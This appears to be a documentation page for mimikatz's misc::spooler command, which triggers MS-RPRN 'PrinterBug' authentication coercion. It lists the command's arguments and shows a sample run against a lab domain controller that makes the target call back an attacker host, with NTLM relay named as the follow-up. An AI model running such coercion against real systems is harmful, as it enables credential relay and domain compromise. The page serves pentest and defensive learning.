# spooler

`misc::spooler` is Mimikat's implementation of the [MS-RPRN abuse (PrinterBug)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn), an authentication coercion technique. It has the following command line arguments:

* `/authuser`: the [User Principal Name (UPN)](https://kb.iu.edu/d/atzp). By default it uses the current user's token
* `/authpassword`: the password of the user
* `/noauth`: use null session
* `/endpoint`: the RPC endpoint. By default is uses `\pipe\spoolss`
* `/server` or `/target`: the target server
* `/connect` or `/callback`: the remote host the target should connect to (attacker host)

```
mimikatz # misc::spooler /connect:win2019.hacklab.local /server:dc.hacklab.local
[auth ] Default (current)
[ rpc ] Endpoint: \pipe\spoolss
[trans] Disconnect eventual IPC: OK
[trans] Connect to IPC: OK
[ rpc ] Resolve Endpoint: OK

Access is denied (can be OK)

[trans] Disconnect IPC: OK
```

For more information on how to exploit this, see The Hacker Recipes. It can be used to NTLM relay attacks, NTLM capture, etc.

{% embed url="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn" %}
